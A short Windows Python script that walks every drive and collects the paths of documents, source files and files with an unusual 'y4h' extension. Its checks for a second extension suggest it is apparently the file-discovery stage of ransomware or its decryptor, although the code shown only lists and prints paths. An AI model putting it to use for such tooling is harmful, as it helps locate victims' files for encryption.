import base64
import sys,os,time
import win32api
def find_file(method):
    list1=[]
    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
        for root,dirs,files in os.walk(drive):
            for f in files:
                if(method==1):
                    try:
                        ext = f.split(".")[1]
                    except:
                            continue
                elif(method==2):
                    try:
                        ext = f.split(".")[2]
                    except:
                        continue
                if(ext == "y4h" or ext == "docx" or ext == "txt" or ext == "pptx" or ext == "pdf" or ext == "json" or ext == "html" or ext == "css" or ext == "js" or ext == "c" or ext == "java" or ext=="py"):
                    try:
                        path = str(os.path.join(root, f))
                        list1.append(path)
                        print(list1)
                    except:
                        continue
    return list1 

print(find_file(1))
